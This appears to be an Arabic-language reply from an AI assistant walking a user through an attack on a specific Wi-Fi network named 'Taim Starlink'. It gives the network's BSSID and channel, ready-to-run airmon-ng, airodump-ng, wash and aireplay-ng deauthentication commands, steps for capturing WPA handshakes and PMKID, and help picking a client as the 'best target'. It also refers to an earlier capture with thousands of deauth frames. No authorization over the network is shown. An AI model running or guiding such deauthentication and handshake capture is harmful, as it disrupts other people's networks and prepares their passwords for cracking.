مفهوم. سنعمل كـ **Pre‑Auth Wi‑Fi Assessment** فقط: لا اتصال، لا Gateway IP، لا فحص راوتر داخلي، لا UPnP، لا لوحة إدارة. كل شيء من الهواء: Beacon/Probe/Auth/Assoc/EAPOL/PMF/WPS/Deauth behavior.

نفذت تحققًا أوليًا الآن، وهذه النتائج مهمة:

- الواجهة اللاسلكية: `wlp4s0`
- البطاقة تدعم `monitor mode`
- الأدوات الموجودة:
  - `aircrack-ng`
  - `airmon-ng`
  - `airodump-ng`
  - `aireplay-ng`
  - `hcxpcapngtool`
  - `hcxdumptool`
  - `iw`
  - `nmcli`
- `Taim Starlink` ظاهرة حاليًا:
  - BSSID: `80:AF:CA:CA:A3:D3`
  - Channel: `11`
  - Signal: `55`
  - Security كما يظهر من `nmcli`: `WPA1 WPA2`

النقطة الأخيرة مهمة جدًا: ظهور `WPA1 WPA2` قد يعني أن الراوتر في وضع mixed mode، وليس WPA2‑AES فقط. هذا لا يعني اختراق مباشر، لكنه إعداد أضعف من الأفضل.

## المرحلة 1: تثبيت معلومات الشبكة بدون اتصال

نفّذ هذا أولًا:

```bash
nmcli -f ssid,bssid,chan,signal,security dev wifi list --rescan yes
```

نريد تأكيد هذه القيم:

```text
SSID: Taim Starlink
BSSID: 80:AF:CA:CA:A3:D3
Channel: 11
Security: WPA1 WPA2 أو WPA2
```

ثم نفّذ فحص Beacon/RSN تفصيلي:

```bash
sudo iw dev wlp4s0 scan | grep -A80 -i "SSID: Taim Starlink"
```

ابحث في الناتج عن:

```text
RSN
WPA
Group cipher
Pairwise ciphers
Authentication suites
capabilities
```

التفسير:

- إذا وجدت `WPA:` و `RSN:` معًا، فالشبكة غالبًا mixed WPA/WPA2.
- إذا وجدت `TKIP`، فهذا ضعف إعدادات.
- إذا وجدت فقط `CCMP` فهذا أفضل.
- إذا وجدت `MFP required` أو ما يشبهها، فهذا يعني PMF إجباري.
- إذا وجدت `MFP capable` فقط، فهذا يعني PMF اختياري.
- إذا لم تجد MFP/PMF غالبًا غير مفعل.

## المرحلة 2: تشغيل Monitor Mode

تحذير عملي: الأمر التالي سيوقف اتصال Wi‑Fi الحالي مؤقتًا، وهذا طبيعي.

```bash
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng start wlp4s0 11
```

بعدها اعرف اسم واجهة المونيتور:

```bash
iw dev
```

غالبًا ستكون واحدة من هذه:

```text
wlp4s0mon
wlan0mon
```

سأسميها هنا:

```text
<MON>
```

استبدلها بالاسم الحقيقي.

## المرحلة 3: مراقبة الشبكة فقط

```bash
sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 <MON>
```

ما نقرأه من الشاشة:

- `PWR`: قوة الإشارة.
- `Beacons`: هل الشبكة ثابتة.
- `ENC`: هل WPA/WPA2.
- `CIPHER`: CCMP أو TKIP.
- `AUTH`: PSK.
- قسم `STATION`: العملاء المتصلون.

إذا ظهرت أجهزة في قسم `STATION`، سجّل أقوى عميل من ناحية الإشارة. في الملف السابق كان العميل المهم للـ EAPOL:

```text
3E:4F:AE:61:46:3F
```

لكن لا تفترض أنه نفسه الآن. نقرأ الواقع الحالي.

## المرحلة 4: التقاط نظيف طويل

شغّل التقاطًا مخصصًا:

```bash
sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 -w taim_preauth <MON>
```

اتركه 10 إلى 20 دقيقة.

الهدف هنا ليس الهجوم، بل جمع:

- Beacon frames
- Probe responses
- Association / Authentication
- EAPOL إذا حدث reconnect طبيعيًا
- قائمة العملاء
- هل توجد PMKID أو handshake

بعد الإيقاف، ستظهر ملفات مثل:

```text
taim_preauth-01.cap
taim_preauth-01.csv
taim_preauth-01.kismet.csv
```

حللها:

```bash
aircrack-ng taim_preauth-01.cap
hcxpcapngtool taim_preauth-01.cap
```

نتائج مهمة:

- `WPA handshake`: موجود أو لا.
- `PMKID`: موجود أو لا.
- `EAPOL messages`: عددها.
- `EAPOL pairs`: هل يوجد زوج صالح.
- `DEAUTHENTICATION`: هل هناك deauth طبيعي أو خارجي.

## المرحلة 5: اختبار WPS

أنت قلت إن WPS غير مفعل. نثبّت ذلك بأداة مناسبة إن كانت موجودة.

تحقق:

```bash
command -v wash
```

إذا لم تكن موجودة:

```bash
sudo apt install -y reaver
```

ثم:

```bash
sudo wash -i <MON> -C
```

التفسير:

- إذا لم تظهر `Taim Starlink`: غالبًا WPS غير مفعل أو لا يعلن نفسه.
- إذا ظهرت `WPS Locked`: WPS موجود لكنه مقفل.
- إذا ظهرت بدون locked: هذا مسار منفصل، لكن بما أنك قلت غير مفعل، غالبًا لن نتابعه.

## المرحلة 6: اختبار PMF / مقاومة Deauth

أولًا لا نبدأ بالـ deauth. نحلل الإعلان من Beacon.

إذا ظهر من التحليل أن PMF غير مطلوب، نعمل اختبارًا محدودًا جدًا داخل اللاب.

افتح نافذة أولى للتقاط handshake:

```bash
sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 -w taim_deauth_test <MON>
```

في نافذة ثانية، اختبار deauth عام محدود:

```bash
sudo aireplay-ng --deauth 3 -a 80:AF:CA:CA:A3:D3 wlp4s0mon
```

هذا يرسل 3 محاولات فقط، وليس هجومًا مستمرًا.

إذا أردت اختبار عميل محدد ظهر في `STATION`:

```bash
sudo aireplay-ng --deauth 3 -a 80:AF:CA:CA:A3:D3 -c <CLIENT_MAC> <MON>
```

التفسير:

- إذا اختفى العميل ثم عاد وظهر `WPA handshake`، فالشبكة والعملاء قابلون عمليًا لهذا السيناريو.
- إذا لم يتأثر العميل أو لم يحدث reconnect واضح، قد يكون PMF مفعلًا أو العميل بعيدًا أو غير نشط.
- إذا كان PMF required، غالبًا deauth spoofing لا يعمل على الأجهزة الداعمة.

بعدها حلل:

```bash
aircrack-ng taim_deauth_test-01.cap
hcxpcapngtool taim_deauth_test-01.cap
```

## المرحلة 7: تحليل ما لدينا من الملف السابق

من ملفك السابق نحن نعرف مسبقًا:

- يوجد handshake.
- يوجد `3980` Deauthentication frames.
- يوجد `32` EAPOL messages.
- يوجد EAPOL pair صالح.
- الشبكة كانت على channel `11`.
- `hcxpcapngtool` حذر من كثرة deauth.

هذا يعني أن سيناريو deauth + reconnect نجح سابقًا أو على الأقل حدث بكثافة. الاختبار الجديد هدفه معرفة هل هذا ما زال صحيحًا الآن، وهل PMF غائب أو اختياري.

## المرحلة 8: مؤشرات مهمة يجب ألا نهملها

في المسح الحالي ظهرت شبكة مخفية:

```text
--  82:AF:CA:EA:A3:D3  CH 11  WPA2
```

هذه قريبة جدًا من BSSID الخاص بـ `Taim Starlink`:

```text
80:AF:CA:CA:A3:D3
```

لا أستنتج منها شيئًا حاسمًا الآن، لكنها تستحق مراقبة. قد تكون:

- شبكة مخفية من نفس الجهاز.
- واجهة ثانية/Guest/mesh.
- جهاز قريب من نفس العائلة.
- تشابه مصادف.

أثناء `airodump-ng` راقب هل تظهر على نفس القناة وبنفس قوة الإشارة تقريبًا.

## ما أحتاجه منك بعد التنفيذ

أرسل لي نواتج هذه الأوامر أو الملفات:

```bash
nmcli -f ssid,bssid,chan,signal,security dev wifi list --rescan yes
sudo iw dev wlp4s0 scan | grep -A80 -i "SSID: Taim Starlink"
aircrack-ng taim_preauth-01.cap
hcxpcapngtool taim_preauth-01.cap
```

وأرسل أيضًا محتوى:

```bash
cat taim_preauth-01.csv
```

بعدها سأعطيك تقريرًا واضحًا:

- هل WPA mixed mode موجود؟
- هل TKIP موجود؟
- هل PMF غير مفعل؟
- هل WPS مغلق فعلًا؟
- هل handshake صالح؟
- هل PMKID موجود؟
- أي عميل هو أفضل هدف تعليمي للالتقاط؟
- هل الشبكة قابلة لسيناريو deauth/reconnect؟
- ما الفجوات الواقعية قبل الاتصال؟

الخلاصة: في مرحلة ما قبل الاتصال، النجاح ليس “معرفة Gateway IP”. النجاح هو بناء صورة دقيقة عن حماية 802.11 نفسها. من المعطيات الحالية، أهم فرضيتين نختبرهما الآن هما: `WPA1/WPA2 mixed mode` وغياب أو ضعف `PMF`.
